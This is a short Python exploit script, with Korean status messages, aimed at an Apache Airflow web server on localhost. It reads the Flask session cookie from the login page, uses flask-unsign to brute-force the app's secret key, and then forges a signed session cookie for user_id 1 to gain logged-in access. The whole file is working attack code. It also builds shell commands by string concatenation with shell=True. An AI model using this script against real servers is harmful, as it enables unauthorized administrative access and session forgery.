import requests
import re
import subprocess

url = "http://localhost:8080/admin/airflow/login"
response = requests.get(url)
set_cookie_header = response.headers.get("Set-Cookie")
session_value = re.search(r'session=(.*?);', set_cookie_header)

if session_value:
    session_value = session_value.group(1)
    print("Session 값:", session_value)
else:
    print("Session 값이 없습니다.")

command = "flask-unsign -u -c " + session_value
result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if result.returncode == 0:
    print("secret")
    print(result.stdout)
else:
    print("명령 실행 실패")
    print(result.stderr)

crack_session = result.stdout
crack_session = crack_session.replace('\'','').replace('\n','')
command2 = "flask-unsign -s --secret "+crack_session+" -c \"{'user_id': '1', '_fresh': False, '_permanent': True}\""
result2 = subprocess.run(command2, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

if result2.returncode == 0:
    print("final session")
    print(result2.stdout)
else:
    print("명령 실행 실패")
    print(result2.stderr)